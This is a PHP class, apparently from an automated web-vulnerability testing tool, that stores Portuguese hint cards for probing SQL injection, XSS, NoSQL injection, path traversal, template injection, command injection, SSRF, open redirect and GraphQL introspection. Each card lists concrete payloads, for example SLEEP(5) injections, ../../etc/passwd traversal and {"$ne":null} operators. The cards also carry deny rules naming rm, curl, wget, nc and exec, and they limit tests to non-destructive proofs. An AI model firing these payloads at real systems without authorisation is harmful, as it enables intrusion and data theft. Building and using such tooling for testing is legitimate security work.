<?php

namespace App\Security;

final class TechniqueCards
{
    private const CARDS = [
        'sqli_error' => [
            'sinais' => ['sql', 'mysql', 'mysqli', 'postgres', 'pg_', 'ora-', 'oracle', 'sqlite', 'mariadb', 'odbc', 'sqlstate', 'syntax', 'quotation', 'query', 'where', 'select'],
            'dicas' => [
                "Quebre a consulta com aspas e parênteses: ' ') '; \" \") \")) até o banco vazar uma assinatura de erro.",
                'Force erro por conversão de tipo: CAST, CONVERT, extractvalue(1,concat(0x7e,version())), updatexml.',
                "Se um caractere some, troque a aspa (' por \"), comente dentro da palavra (sel/**/ect) e tente %27, %2527.",
            ],
        ],
        'sqli_bool' => [
            'sinais' => ['sql', 'mysql', 'postgres', 'sqlite', 'where', 'select', 'filtro', 'busca', 'search', 'listagem'],
            'dicas' => [
                "payload = condição VERDADEIRA e false_payload = condição FALSA, do MESMO tamanho: 1' AND '1'='1'-- - versus 1' AND '1'='2'-- -.",
                'Numérico sem aspas: 1 AND 1=1-- - versus 1 AND 1=2-- -. Prova: TRUE casa com o original, FALSE muda, duas vezes.',
            ],
        ],
        'sqli_time' => [
            'sinais' => ['sql', 'mysql', 'postgres', 'mssql', 'sqlite', 'where', 'select', 'blind', 'id='],
            'dicas' => [
                "Atraso de 5 s sem destruir nada: 1' AND SLEEP(5)-- - (MySQL), 1'||pg_sleep(5)-- (Postgres), 1 WAITFOR DELAY '0:0:5'-- (MSSQL).",
                'SQLite: randomblob pesado dentro de um AND. Prova: o atraso medido na resposta.',
            ],
        ],
        'xss' => [
            'sinais' => ['html', 'text/html', 'reflect', 'echo', 'nome', 'name', 'q=', 'busca', 'search', 'comentario', 'comment', 'mensagem', 'titulo'],
            'dicas' => [
                'Ache o contexto no trecho e ponha {MARKER} onde vira markup vivo: corpo HTML -> "><{MARKER}>; atributo -> quebre com "> antes; string JS -> </script><{MARKER}>.',
                'Sem < > permitidos: breakout de atributo com handler (" autofocus onfocus={MARKER}), SVG/MathML, mistura de caixa, entidades HTML, %-encoding e duplo %-encoding. {MARKER} precisa voltar cru.',
            ],
        ],
        'nosql' => [
            'sinais' => ['mongo', 'mongoose', 'bson', 'nosql', 'objectid', 'cast to', 'document', 'couch', 'firestore'],
            'dicas' => [
                'Injeção de operador na query ou no JSON do corpo: {"$ne":null}, {"$gt":""}, {"$regex":"."}, {"$where":"1"}, ou [$ne]=x na querystring.',
                'Prova: um erro de banco de documentos. Nunca remove, update, insert, mapReduce ou eval.',
            ],
        ],
        'traversal' => [
            'sinais' => ['file', 'path', 'download', 'include', 'template', 'lang', 'img', 'image', 'arquivo', 'doc', 'anexo', 'no such file', 'failed to open', 'fopen', 'open_basedir'],
            'dicas' => [
                '../ e encodings mirando /etc/passwd ou windows/win.ini: ../../../../etc/passwd, %2e%2e%2f, ....//....//, ..%252f, caminho absoluto.',
                'Prova: a assinatura do arquivo na resposta. Só leitura: nunca escrever, apagar ou incluir URL externa.',
            ],
        ],
        'ssti' => [
            'sinais' => ['template', 'jinja', 'twig', 'freemarker', 'velocity', 'handlebars', 'erb', 'thymeleaf', 'smarty', '{{', '${', '#{', 'render', 'view'],
            'dicas' => [
                'Avalie {A}*{B} na sintaxe do motor: {{ {A}*{B} }}, ${ {A}*{B} }, #{ {A}*{B} }, <%= {A}*{B} %>, [[${A}*${B}]], *{ {A}*{B} }.',
                'Prova: o produto aparece na resposta. Fique na multiplicação: nada de __class__, __globals__, system, exec, Runtime (a trava bloqueia).',
            ],
        ],
        'command' => [
            'sinais' => ['cmd', 'exec', 'system', 'shell', 'ping', 'host', 'nslookup', 'dns', '/bin/', 'sh:'],
            'dicas' => [
                'Metacaractere rodando echo $(({A}*{B})): ; | && || backticks $(). Prova: o produto aparece.',
                'Só echo local: sem rm, mv, curl, wget, nc, bash, python ou host externo (a trava bloqueia).',
            ],
        ],
        'command_time' => [
            'sinais' => ['cmd', 'exec', 'system', 'shell', 'ping', 'host', 'nslookup', 'dns'],
            'dicas' => [
                'Atraso por comando local: ; sleep 5, | ping -c 6 127.0.0.1, && sleep 5. Prova: o atraso medido.',
                'Só sleep e ping local: nenhum host externo nem comando destrutivo.',
            ],
        ],
        'ssrf' => [
            'sinais' => ['url', 'uri', 'link', 'webhook', 'callback', 'fetch', 'feed', 'image', 'img', 'import', 'proxy', 'avatar', 'preview', 'pdf', 'render'],
            'dicas' => [
                'Dê {CALLBACK} a qualquer coisa que busca uma URL (url, webhook, image, feed, import, callback). Prova: o servidor chama nosso coletor.',
                'Tente parâmetro oculto e corpo JSON. Deixe {CALLBACK} sem esquema: a plataforma preenche o coletor (a trava barra http:// digitado).',
            ],
        ],
        'open_redirect' => [
            'sinais' => ['redirect', 'return', 'next', 'goto', 'continue', 'url', 'dest', 'target', 'location', 'callback', 'retorno', 'voltar', '3xx', '302', '301'],
            'dicas' => [
                'Mande {CANARY} como host relativo ao esquema: //{CANARY} e /\\{CANARY} (a trava barra esquema explícito como https://).',
                'Prova: um Location 3xx apontando para esse host.',
            ],
        ],
        'graphql' => [
            'sinais' => ['graphql', '/graphql', 'query{', '__schema', 'apollo', 'resolver', 'mutation', 'gql'],
            'dicas' => [
                'Introspecção no endpoint GraphQL: {__schema{queryType{name} types{name}}}. Prova: o schema volta.',
                'Só a introspecção tem prova por oráculo; use o schema retornado para mapear os campos sensíveis expostos.',
            ],
        ],
    ];

    public static function all(): array
    {
        return self::CARDS;
    }

    public static function techniques(): array
    {
        return array_keys(self::CARDS);
    }

    public static function relevant(array $context, int $limit = 3): array
    {
        $values = [];
        array_walk_recursive($context, function ($value) use (&$values): void {
            if (is_scalar($value)) {
                $values[] = (string) $value;
            }
        });
        $fingerprint = mb_strtolower(implode(' ', $values));

        $rows = [];
        $index = 0;
        foreach (self::CARDS as $technique => $card) {
            $score = 0;
            foreach ($card['sinais'] as $signal) {
                if ($signal !== '' && str_contains($fingerprint, $signal)) {
                    $score++;
                }
            }
            $rows[] = ['tecnica' => $technique, 'dicas' => $card['dicas'], 'score' => $score, 'ordem' => $index++];
        }

        usort($rows, fn ($a, $b) => ($b['score'] <=> $a['score']) ?: ($a['ordem'] <=> $b['ordem']));

        return array_map(
            fn ($row) => ['tecnica' => $row['tecnica'], 'dicas' => $row['dicas']],
            array_slice($rows, 0, max(1, $limit)),
        );
    }
}
